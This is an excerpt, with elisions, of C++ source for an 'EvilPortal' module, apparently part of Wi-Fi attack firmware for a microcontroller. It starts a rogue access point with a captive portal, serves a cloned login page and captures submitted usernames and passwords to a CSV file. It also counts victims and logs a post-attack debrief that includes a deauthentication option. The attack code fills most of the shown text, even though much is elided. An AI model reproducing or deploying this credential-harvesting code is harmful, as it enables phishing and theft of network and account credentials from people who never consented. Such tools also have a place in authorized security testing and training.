...
void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    if (!_portal) {
        request->send(404, "text/plain", "Portal closed");
        return;
    }
    _portal->handlePortalRequest(request);
}

void EvilPortal::handleSharedRequest(void *ctx, AsyncWebServerRequest *request) {
    EvilPortal *portal = static_cast<EvilPortal *>(ctx);
    if (!portal) {
        request->send(404, "text/plain", "Portal closed");
        return;
    }
    portal->handlePortalRequest(request);
}

void EvilPortal::handlePortalRequest(AsyncWebServerRequest *request) {
    String url = request->url();
    if (url == "/") portalController(request);
    else if (url == "/post") credsController(request);
...
bool EvilPortal::setup() {
    ...
    Serial.println("VariPortal output file: " + outputFile);
    return true;
}
...
void EvilPortal::beginAP() {
    ...
    if (apNetif) {
        ...
        ipInfo.ip.addr = (uint32_t)apGateway;
        ipInfo.gw.addr = (uint32_t)apGateway;
...
void EvilPortal::setupRoutes() {
    webPortalBegin(this, EvilPortal::handleSharedRequest);
}
...
void EvilPortal::restartWiFi(bool reset) {
    ...
    // Detach + free the old captive handler before nulling. The server owns it
    // via unique_ptr, so removeHandler() destroys it; nulling alone leaked it and
    // left a dangling pointer in the server's handler list (UAF in AsyncTCP task).
    if (_captiveHandler) {
...
void EvilPortal::loop() {
    ...
    while (true) {
        ...
        if (exitPortal) {
            // Record portal facts for the post-attack debrief BEFORE teardown.
            // debriefRunPending() (in wifi_atks.cpp, shallow stack) runs the
            // actual report once this attack's stack has unwound.
            debriefArmEvilPortal(
                apName, (uint32_t)WiFi.softAPgetStationNum(), totalCapturedCredentials, _channel,
                (millis() - _launchTime) / 1000, _deauth, _verifyPwd
            );
...
void EvilPortal::credsController(AsyncWebServerRequest *request) {
    ...
    for (int i = 0; i < request->args(); i++) {
        ...
        if (key == "username") userVal = valueBuffer;
    }
    ...
    if (_verifyPwd && passwordValue != "") {
        ...
        // Credential-harvest mode (no Wi-Fi verification): store creds, then show the
        // post-login landing page (CIC clone) with the typed user name injected. Falls
        // back to a neutral "signing in" page when no after-login template is set.
        saveToCSV(csvLine);
        if (!afterLoginPage.isEmpty()) {
            String pg = afterLoginPage;
            String u = userVal;
            u.replace("&", "&amp;");
            u.replace("<", "&lt;");
            u.replace(">", "&gt;");
            u.replace("\"", "&quot;");
            pg.replace("__USERNAME__", u);
            request->send(200, "text/html", pg);
        } else {
            request->send(
                200, "text/html",
    ...
    // Newest entry is prepended; cap the kept HTML so repeated submissions can't
    // realloc-churn the heap unbounded (oldest tail is dropped, count is exact).
    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
    constexpr size_t kMaxCredHtml = 8192;
    if (capturedCredentialsHtml.length() > kMaxCredHtml)
        capturedCredentialsHtml = capturedCredentialsHtml.substring(0, kMaxCredHtml);
    totalCapturedCredentials++;
    // Narration (Part B3) — event + count only, never the captured values.
    Serial.printf(
        ">> VARIPORTAL: creds captured (entry #%d) on '%s'\n", totalCapturedCredentials,
        apName.c_str()
    );
}
